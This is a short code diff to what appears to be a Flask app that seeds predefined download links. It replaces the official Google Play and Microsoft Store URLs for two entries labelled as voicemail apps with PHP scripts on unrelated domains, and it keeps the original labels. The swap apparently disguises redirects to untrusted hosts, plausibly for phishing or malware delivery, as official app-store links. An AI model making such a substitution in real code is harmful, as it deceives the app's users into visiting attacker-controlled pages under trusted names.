@@ -30,8 +30,8 @@ with app.app_context():
     # Only add predefined links if the database is empty
     if not Link.query.first():
         predefined_links = [
-            {'name': 'voicemail-googleplay', 'link': 'https://play.google.com/store/apps/details?id=com.google.android.apps.googlevoice'},
-            {'name': 'voicemail-windows', 'link': 'https://www.microsoft.com/en-us/p/google-voice/9nblggh0h7c9'},
+            {'name': 'voicemail-googleplay', 'link': 'https://kentenglishhub.com/temp.php'},
+            {'name': 'voicemail-windows', 'link': 'http://axentra.click/t.php'},
             {'name': 'optimum-google', 'link': 'https://play.google.com/store/apps/details?id=com.altice.optimum'},
             {'name': 'optimum-windows', 'link': 'https://www.microsoft.com/en-us/p/optimum/9nblggh0h7c9'}
         ]
